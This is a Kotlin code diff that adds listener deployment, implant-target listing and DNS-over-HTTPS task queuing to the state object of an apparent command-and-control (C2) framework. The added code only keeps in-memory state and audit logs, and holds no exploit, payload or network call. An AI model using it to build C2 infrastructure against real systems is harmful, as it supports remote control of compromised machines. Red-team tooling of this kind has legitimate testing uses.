@@ -95,6 +95,73 @@ object C2State {
     private val _loot = MutableStateFlow<List<LootEntry>>(emptyList())
     val loot: StateFlow<List<LootEntry>> = _loot.asStateFlow()
 
+    // ---- Unique listener deployment ----
+    private val _listeners = MutableStateFlow<List<ListenerInfo>>(emptyList())
+    val listeners: StateFlow<List<ListenerInfo>> = _listeners.asStateFlow()
+
+    data class ListenerInfo(
+        val port: Int,
+        val name: String,
+        val target: String,
+        val exploitType: String,
+        val running: Boolean,
+        val hits: Int,
+        val createdAt: String
+    )
+
+    fun deployListener(name: String, target: String, exploitType: String, port: Int? = null): ListenerInfo {
+        val assignedPort = port ?: findFreePort()
+        val info = ListenerInfo(assignedPort, name, target, exploitType, true, 0, now())
+        _listeners.value = _listeners.value + info
+        audit("C2", "Listener '$name' deployed on :$assignedPort (target: $target, exploit: $exploitType)")
+        return info
+    }
+
+    fun stopListener(port: Int): Boolean {
+        val current = _listeners.value
+        val listener = current.find { it.port == port } ?: return false
+        _listeners.value = current - listener
+        audit("C2", "Listener '${listener.name}' on :$port stopped")
+        return true
+    }
+
+    fun stopAllListeners() {
+        val count = _listeners.value.size
+        _listeners.value = emptyList()
+        audit("C2", "All listeners stopped ($count)")
+    }
+
+    fun recordListenerHit(port: Int) {
+        _listeners.value = _listeners.value.map {
+            if (it.port == port) it.copy(hits = it.hits + 1) else it
+        }
+    }
+
+    fun dohShellTargets(): JSONArray {
+        val arr = JSONArray()
+        _implants.value.forEach { (host, info) ->
+            arr.put(JSONObject().put("host", host).put("os", info.os ?: "unknown"))
+        }
+        return arr
+    }
+
+    fun pushDohTask(body: JSONObject): JSONObject {
+        val hostId = body.optString("host_id", "hq")
+        val command = body.optString("command", "shell")
+        val params = body.optJSONObject("params") ?: JSONObject()
+        audit("C2", "DoH task pushed to $hostId: $command")
+        return JSONObject().put("ok", true).put("host_id", hostId).put("command", command)
+    }
+
+    private fun findFreePort(): Int {
+        var port = 9100
+        while (port < 9999) {
+            if (_listeners.value.none { it.port == port }) return port
+            port++
+        }
+        throw IllegalStateException("No available ports in range 9100-9999")
+    }
+
     fun init(root: File) {
         synchronized(lock) {
             if (initialized) return
